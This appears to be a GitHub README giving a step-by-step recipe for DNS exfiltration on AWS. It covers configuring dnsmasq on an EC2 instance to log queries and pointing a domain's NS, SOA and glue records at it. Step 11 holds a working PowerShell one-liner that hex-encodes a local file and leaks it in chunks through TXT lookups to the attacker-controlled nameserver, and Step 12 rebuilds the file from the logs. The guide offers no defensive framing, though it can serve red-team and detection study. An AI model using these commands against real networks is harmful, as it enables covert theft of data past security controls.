# DNS Exfil
DNS Exfiltration Setup on AWS

## Step 1: Purchase Domain Name on Route 53
Verify your email!

## Step 2: Create EC2 instance to host DNS service and logging
Use Amazon Linux OS, or any Linux OS of your preference.
Logging will contain DNS requests with encoded information, which we can then grep and cut later.

## Step 3: Create Security Groups
Inbound - Allow ICMP, TCP DNS, UDP DNS, SSH  
Outbound - Any  

## Step 4: Install dnsmasq on EC2 instance and configure it
sudo yum install dnsmasq  
sudo nano /etc/dnsmasq.conf then input the content below, right at the bottom of the config file  
  
listen-address=<EC2's private IP>  
address=/#/<EC2's public IP>  
log-queries  
log-facility=/var/log/dnsmasq.log  
  
Restart the VM, or find a way to restart dnsmasq (sudo systemctl restart systemd-networkd.service)  

sudo dnsmasq  

## Step 5: Go to Route 53 config, note down default SOA and NS records


## Step 6: Create A Record to point from record name to your EC2 instance
**Record Name:** ns1.<yourdomain.com>  
**Type:** A  
**Value:** <your EC2 public IP address>  
**TTL:** 300  

**Record Name:** ns2.<yourdomain.com>  
**Type:** A  
**Value:** <your EC2 public IP address>
**TTL:** 300  

## Step 7: Modify existing NS Record to point to your NS records, which point to your EC2 instance
**Record Name:** <yourdomain.com>  
**Type:** NS  
**Value:**  
ns1.<yourdomain.com>  
ns2.<yourdomain.com>  
**TTL:** 60  

## Step 8: Modify existing SOA record to point to your NS record, which points to your EC2 instance
**Record Name:** <yourdomain.com>  
**Type:** SOA  
**Value:** ns1.<yourdomain.com>. admin.<yourdomain.com> 1 7200 900 1209600 86400  
**TTL:** 60  

## Step 9: Modify glue records
In Route 53, click on Registered domains > click Actions > Edit name servers

![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/ca4d78ab-49ac-4880-bbfc-755626bd8bcf)  
    

Note down the current name server settings before making any modifications  

![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/35cf3290-b494-45de-9752-fea7e57e7f91)


## Step 9: Use CMD to nslookup as a test
nslookup -q=TXT 12332145343dafdsa234234123123453asdf234sadfsadfasdf ns1.<yourdomain.com>  


## Step 10: Check your DNS logs in EC2
sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"  


## Step 11: Powershell command to hex encode a file, split, and do nslookup

`certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.<yourdomain.com>" ns1.<yourdomain.com>; sleep 5} `


## Step 12: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing

`sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
`sudo cat output | xxd -p -r > ToExfil.txt | cat ToExfil.txt`  

